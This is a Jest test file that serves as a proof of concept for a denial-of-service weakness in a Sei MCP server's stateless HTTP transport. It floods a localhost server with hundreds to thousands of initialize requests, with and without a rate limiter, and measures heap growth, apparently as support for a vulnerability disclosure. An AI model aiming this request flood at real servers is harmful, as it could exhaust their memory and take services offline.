import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import express from 'express';

// 1. Mock external modules to prevent outbound network requests
jest.mock('../../mintlify/search.js', () => ({
    createSeiJSDocsSearchTool: jest.fn(async () => {})
}));

jest.mock('../../docs/index.js', () => ({
    createDocsSearchTool: jest.fn(async () => {})
}));

// Mock package-info.ts to prevent __filename crash in Jest ESM
jest.mock('../../server/package-info.js', () => ({
    getPackageInfo: () => ({
        name: 'sei-mcp-server',
        version: '0.0.0',
        description: 'Sei MCP Server'
    })
}));

import { StreamableHttpTransport } from '../../server/transport/streamable-http.js';
import { getServer } from '../../server/server.js';
import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';

// Custom Rate Limiter
const createRateLimiter = () => {
    let windowStart = 0;
    let requestCount = 0;
    const windowMs = 1000;
    const max = 100;

    return (req: any, res: any, next: any) => {
        const now = Date.now();
        if (!windowStart || (now - windowStart > windowMs)) {
            windowStart = now;
            requestCount = 0;
        }

        if (requestCount >= max) {
            return res.status(429).json({ error: 'Too Many Requests' });
        }

        requestCount++;
        next();
    };
};

describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
    let transport: StreamableHttpTransport;
    const targetPort = 8913;

    afterAll(async () => {
        if (transport) await transport.stop();
    });

    // TEST 1: Without Rate Limiter (Bare-metal server)
    it('Test 1: should cause memory exhaustion on concurrent requests (No Limit)', async () => {
        transport = new StreamableHttpTransport(targetPort, 'localhost', '/mcp', 'disabled');
        await transport.start({} as any);

        const targetUrl = `http://localhost:${targetPort}/mcp`;
        const payload = { jsonrpc: '2.0', method: 'initialize', params: {}, id: 1 };

        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`\n[Test 1 - No Limit] Memory before: ${memBefore.toFixed(2)} MB`);

        const attackCount = 500;
        const requests = [];
        for (let i = 0; i < attackCount; i++) {
            requests.push(
                fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {})
            );
        }

        await Promise.all(requests);
        await new Promise(resolve => setTimeout(resolve, 500));

        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`[Test 1 - No Limit] Memory after: ${memAfter.toFixed(2)} MB`);
        console.log(`[Test 1 - No Limit] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        // Memory bloat proves that the McpServer object is instantiated repeatedly
        expect(memAfter).toBeGreaterThan(memBefore);
    });

    // TEST 2: With Rate Limiter (Simulating API Gateway 100 req/s)
    it('Test 2: should still cause memory exhaustion even with a rate limiter (100 req/s)', async () => {
        const app = express();
        app.use(express.json());
        app.use(createRateLimiter());
        
        app.post('/mcp', async (req: any, res: any) => {
            try {
                const mcpServer = await getServer();
                const httpTransport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
                res.on('close', () => {
                    httpTransport.close();
                    mcpServer.close();
                });
                await mcpServer.connect(httpTransport);
                await httpTransport.handleRequest(req, res, req.body);
            } catch (error) {
                if (!res.headersSent) res.status(500).json({ error: 'Internal Server Error' });
            }
        });

        const server = app.listen(8915);
        const targetUrl = `http://localhost:8915/mcp`;
        const payload = { jsonrpc: '2.0', method: 'initialize', params: {}, id: 1 };

        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`\n[Test 2 - With Rate Limit] Memory before: ${memBefore.toFixed(2)} MB`);

        // Send 3000 requests with a 5ms delay (200 req/sec). 
        // Rate limiter only allows 100 req/sec, but the requests that PASS THROUGH still trigger getServer()
        // This attack lasts for 15 seconds continuously, so the GC doesn't have time to clean up heavy objects.
        const attackCount = 3000; 
        for (let i = 0; i < attackCount; i++) {
            fetch(targetUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
            await new Promise(resolve => setTimeout(resolve, 5)); 
        }

        // Give a very short delay for Promises to resolve, but not enough for GC to free memory
        await new Promise(resolve => setTimeout(resolve, 100));

        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`[Test 2 - With Rate Limit] Memory after: ${memAfter.toFixed(2)} MB`);
        console.log(`[Test 2 - With Rate Limit] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        server.close();

        // Even with rate limiting, a sustained attack still causes memory bloat
        expect(memAfter).toBeGreaterThan(memBefore);
    });
});
